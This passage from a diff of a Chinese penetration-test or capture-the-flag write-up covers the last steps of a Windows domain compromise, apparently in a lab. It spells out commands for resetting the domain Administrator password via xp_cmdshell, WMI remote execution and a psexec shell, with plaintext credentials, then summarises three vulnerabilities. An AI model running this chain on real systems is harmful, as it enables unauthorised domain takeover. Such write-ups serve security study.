 & .\invoke_xpcmd.ps1 -Command '%TEMP%\svcmon.exe -cmd "cmd /c net user Administrator Xmcve#2026! /domain > C:\Users\sqlsvc\AppData\Local\Temp\setadmin.txt 2>&1"' -ConnectionTimeout 20
 & .\invoke_xpcmd.ps1 -Command 'cmd /c type C:\Users\sqlsvc\AppData\Local\Temp\setadmin.txt' -ConnectionTimeout 20
 ```
 
-<font style="color:rgb(51, 51, 51);">关键结果：</font>
+关键结果：
 
 The command completed successfully.
 
-<font style="color:rgb(51, 51, 51);">结论：</font>
+结论：
 
-+ <font style="color:rgb(51, 51, 51);">域内 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> 密码已经被成功改为 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Xmcve#2026!</font>`<font style="color:rgb(51, 51, 51);">。</font>
++ 域内 `Administrator` 密码已经被成功改为 `Xmcve#2026!`。
 
-### <font style="color:rgb(51, 51, 51);">6.2 用 WMI 验证管理员上下文</font>
-<font style="color:rgb(51, 51, 51);">目的：证明这组新凭据真的能以管理员身份在远端创建进程，而不是只停留在“理论上应当可用”。</font>
+### 6.2 用 WMI 验证管理员上下文
+目的：证明这组新凭据真的能以管理员身份在远端创建进程，而不是只停留在“理论上应当可用”。
 
-<font style="color:rgb(51, 51, 51);">关键命令：</font>
+关键命令：
 
 ```plain
 $sec = ConvertTo-SecureString 'Xmcve#2026!' -AsPlainText -Force
@@ -4334,61 +4335,61 @@ Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c who
 (Invoke-WebRequest -UseBasicParsing -Uri 'http://192.168.56.101/adminshell.txt').Content
 ```
 
-<font style="color:rgb(51, 51, 51);">关键结果：</font>
+关键结果：
 
 xmcve\administrator
 
-<font style="color:rgb(51, 51, 51);">结论：</font>
+结论：
 
-+ <font style="color:rgb(51, 51, 51);">这里已经拿到了经过现场验证的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> 远程命令执行。</font>
-+ <font style="color:rgb(51, 51, 51);">这一步本身就已经足以证明管理员权限被完全接管。</font>
++ 这里已经拿到了经过现场验证的 `Administrator` 远程命令执行。
++ 这一步本身就已经足以证明管理员权限被完全接管。
 
-## <font style="color:rgb(51, 51, 51);">7. 最终交互 shell 落地</font>
-<font style="color:rgb(51, 51, 51);">工具：Impacket </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">psexec.py</font>`
+## 7. 最终交互 shell 落地
+工具：Impacket `psexec.py`
 
-<font style="color:rgb(51, 51, 51);">目的：把已经验证可用的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> 凭据落成真正交互 shell。</font>
+目的：把已经验证可用的 `Administrator` 凭据落成真正交互 shell。
 
-<font style="color:rgb(51, 51, 51);">前提：</font>
+前提：
 
-+ <font style="color:rgb(51, 51, 51);">已知管理员凭据：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">XMCVE\Administrator / Xmcve#2026!</font>`
-+ <font style="color:rgb(51, 51, 51);">目标 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">445/tcp</font>`<font style="color:rgb(51, 51, 51);"> 开放</font>
-+ <font style="color:rgb(51, 51, 51);">前面已经通过 WMI 验证过该管理员凭据真实有效</font>
++ 已知管理员凭据：`XMCVE\Administrator / Xmcve#2026!`
++ 目标 `445/tcp` 开放
++ 前面已经通过 WMI 验证过该管理员凭据真实有效
 
-<font style="color:rgb(51, 51, 51);">关键命令：</font>
+关键命令：
 
 psexec.py XMCVE/Administrator:'Xmcve#2026!'@192.168.56.101 cmd.exe
 
-<font style="color:rgb(51, 51, 51);">说明：</font>
+说明：
 
-+ <font style="color:rgb(51, 51, 51);">这一步就是把“已验证的 Administrator 远程命令执行”进一步落成交互式 shell。</font>
-+ <font style="color:rgb(51, 51, 51);">如果提交时更强调“已现场证明”，那么上一节的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">adminshell.txt -> xmcve\administrator</font>`<font style="color:rgb(51, 51, 51);"> 已经是强证据。</font>
-+ <font style="color:rgb(51, 51, 51);">如果提交时更强调“完整 shell 终点”，则这一条 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">psexec.py</font>`<font style="color:rgb(51, 51, 51);"> 就是最后一步。</font>
++ 这一步就是把“已验证的 Administrator 远程命令执行”进一步落成交互式 shell。
++ 如果提交时更强调“已现场证明”，那么上一节的 `adminshell.txt -> xmcve\administrator` 已经是强证据。
++ 如果提交时更强调“完整 shell 终点”，则这一条 `psexec.py` 就是最后一步。
 
-## <font style="color:rgb(51, 51, 51);">8. 总结与漏洞点</font>
-<font style="color:rgb(51, 51, 51);">整条利用链可以概括为：</font>
+## 8. 总结与漏洞点
+整条利用链可以概括为：
 
-1. <font style="color:rgb(51, 51, 51);">Web 面本身很薄，但离线分析 Web 根目录发现数据库连接串泄露，直接拿到 MSSQL 明文凭据 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">wuwupor / lovlyBaby</font>`<font style="color:rgb(51, 51, 51);">。</font>
-2. <font style="color:rgb(51, 51, 51);">用该凭据登录 MSSQL 后发现 linked server </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">POO_PUBLIC</font>`<font style="color:rgb(51, 51, 51);"> 映射到了 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sa / dbo</font>`<font style="color:rgb(51, 51, 51);">，从而把 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">wuwupor</font>`<font style="color:rgb(51, 51, 51);"> 横向提到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sysadmin</font>`<font style="color:rgb(51, 51, 51);">。</font>
-3. <font style="color:rgb(51, 51, 51);">开启 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">xp_cmdshell</font>`<font style="color:rgb(51, 51, 51);"> 后，系统命令以 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">XMCVE\sqlsvc</font>`<font style="color:rgb(51, 51, 51);"> 身份执行。</font>
-4. `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`<font style="color:rgb(51, 51, 51);"> 拥有 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SeImpersonatePrivilege</font>`<font style="color:rgb(51, 51, 51);">，借助 GodPotato 直接提到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">NT AUTHORITY\SYSTEM</font>`<font style="color:rgb(51, 51, 51);">。</font>
-5. <font style="color:rgb(51, 51, 51);">以 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(51, 51, 51);"> 重置域内 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> 密码，再用新密码完成管理员远程命令执行与最终交互 shell 落地。</font>
+1. Web 面本身很薄，但离线分析 Web 根目录发现数据库连接串泄露，直接拿到 MSSQL 明文凭据 `wuwupor / lovlyBaby`。
+2. 用该凭据登录 MSSQL 后发现 linked server `POO_PUBLIC` 映射到了 `sa / dbo`，从而把 `wuwupor` 横向提到 `sysadmin`。
+3. 开启 `xp_cmdshell` 后，系统命令以 `XMCVE\sqlsvc` 身份执行。
+4. `sqlsvc` 拥有 `SeImpersonatePrivilege`，借助 GodPotato 直接提到 `NT AUTHORITY\SYSTEM`。
+5. 以 `SYSTEM` 重置域内 `Administrator` 密码，再用新密码完成管理员远程命令执行与最终交互 shell 落地。
 
-<font style="color:rgb(51, 51, 51);">最终漏洞点有三处：</font>
+最终漏洞点有三处：
 
-### <font style="color:rgb(51, 51, 51);">漏洞点 1：Web 根目录泄露 SQL 明文连接凭据</font>
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">C:\inetpub\wwwroot\poo_connection.txt</font>`
-+ <font style="color:rgb(51, 51, 51);">暴露了 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">wuwupor / lovlyBaby</font>`
+### 漏洞点 1：Web 根目录泄露 SQL 明文连接凭据
++ `C:\inetpub\wwwroot\poo_connection.txt`
++ 暴露了 `wuwupor / lovlyBaby`
 
-### <font style="color:rgb(51, 51, 51);">漏洞点 2：MSSQL linked server </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">POO_PUBLIC</font>`<font style="color:rgb(51, 51, 51);"> 映射到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sa</font>`
-+ <font style="color:rgb(51, 51, 51);">低权限 SQL 登录可以通过 linked server 直接在远端以上下文 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sa / dbo</font>`<font style="color:rgb(51, 51, 51);"> 执行语句</font>
-+ <font style="color:rgb(51, 51, 51);">最终导致 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sysadmin</font>`<font style="color:rgb(51, 51, 51);"> 提权</font>
+### 漏洞点 2：MSSQL linked server `POO_PUBLIC` 映射到 `sa`
++ 低权限 SQL 登录可以通过 linked server 直接在远端以上下文 `sa / dbo` 执行语句
++ 最终导致 `sysadmin` 提权
 
-### <font style="color:rgb(51, 51, 51);">漏洞点 3：SQL 服务账号 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`<font style="color:rgb(51, 51, 51);"> 拥有 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SeImpersonatePrivilege</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">xp_cmdshell</font>`<font style="color:rgb(51, 51, 51);"> 落地为 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`<font style="color:rgb(51, 51, 51);"> 可借 GodPotato 提权为 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(51, 51, 51);"> 可直接控制域内 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`
+### 漏洞点 3：SQL 服务账号 `sqlsvc` 拥有 `SeImpersonatePrivilege`
++ `xp_cmdshell` 落地为 `sqlsvc`
++ `sqlsvc` 可借 GodPotato 提权为 `SYSTEM`
++ `SYSTEM` 可直接控制域内 `Administrator`
 
-<font style="color:rgb(51, 51, 51);">至此，完整链路为：</font>
+至此，完整链路为：
 
 ```plain
 信息搜集
